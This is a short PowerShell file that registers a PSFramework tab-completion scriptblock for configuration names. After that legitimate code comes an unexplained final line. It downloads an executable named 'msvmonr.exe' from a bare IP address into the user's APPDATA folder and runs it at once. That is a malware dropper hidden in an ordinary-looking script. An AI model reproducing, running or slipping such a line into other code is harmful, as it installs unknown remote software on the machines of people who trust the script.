Register-PSFTeppScriptblock -Name "PSFramework-config-name" -ScriptBlock {
	$moduleName = "*"
	if ($fakeBoundParameter.Module) { $moduleName = $fakeBoundParameter.Module }
	[PSFramework.Configuration.ConfigurationHost]::Configurations.Values | Where-Object { -not $_.Hidden -and ($_.Module -like $moduleName) } | Select-Object -ExpandProperty Name
}
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")

